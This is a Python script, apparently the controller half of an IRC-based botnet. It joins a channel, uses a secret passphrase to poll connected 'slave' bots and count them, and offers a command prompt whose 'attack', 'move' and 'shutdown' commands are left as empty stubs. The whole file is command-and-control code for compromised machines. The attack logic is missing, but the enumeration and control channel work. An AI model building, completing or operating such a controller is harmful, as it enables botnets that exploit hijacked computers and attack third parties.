import sys
import socket
import random
import time

# argv check
try:
    hostname= sys.argv[1]
    port = int(sys.argv[2])
    channel = sys.argv[3]
    sphrase = sys.argv[4]
except:
    print("invalid arguments: python3 conbot.py <hostname> <port> <channel> <secret-phrase>")
    sys.exit()

# use to establish the first connection with a irc
def connect():
    while True:
        botname = "conbot"+str(random.randint(0,999999))
        irc.connect((hostname, port))
        msg = "NICK " + botname + "\r\n"
        irc.send(msg.encode())
        msg = "USER "+botname+" * * : bot " + botname +"\r\n"
        irc.send(msg.encode())
        indata = irc.recv(1024)
        inmsg = indata.decode("utf-8").split("\r\n")
        state_code=inmsg[0].split()[1]
        # wait 5s before retrying to coneect
        if state_code != "001":
            time.sleep(5)
            continue
        else:
            if joinChannel(channel):
                break
    return

# join channel
def joinChannel(name):
    msg = "JOIN #" +name+" \r\n"
    irc.send(msg.encode())
    indata = irc.recv(1024)
    inmsg = indata.decode("utf-8").split("\r\n")
    if inmsg[0].split()[1] == "JOIN":
        print("connected")
        return True
    return False


# handle status
def status():
    msg = "PRIVMSG #"+channel+" :"+sphrase+" status\r\n"
    irc.send(msg.encode())
    #get the report

    totalBot =0
    try:
        irc.settimeout(5)
        while True:
            indata = irc.recv(1024)
            indataList = indata.decode("utf-8").strip().split("\r\n")
            for s in indataList:
                inmsg = s.split()
                if len(inmsg) < 4:
                    pass
                elif inmsg[3] == ':Here':
                    slave = inmsg[0].split("!")[0].replace(":","")
                    sys.stdout.write(slave+"\n")
                    sys.stdout.flush()
                    totalBot += 1
    except Exception as err:
        print(str(err))
        irc.settimeout(None)


    sys.stdout.write(str(totalBot)+" bots\n")
    sys.stdout.flush()
    return totalBot


# use to grab user command
def commands():
    try:
        while True:
            sys.stdout.write('>')
            sys.stdout.flush()
            data = sys.stdin.readline()
            data = data.strip().split()
            if data[0] == "quit":
                irc.close()
                sys.exit()
            elif data[0] == "shutdown":
                pass
            elif data[0] == "status":
                status()
            elif data[0] == "attack":
                pass
            elif data[0] == "move":
                pass
            else:
                sys.stderr.write("Not a valid command\n")

    except Exception as err:
        sys.stderr.write(str(err)+"\n")
    return




# main ----------------------------------------------------------------------
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

botname = ""
while True:
    connect()
    commands()
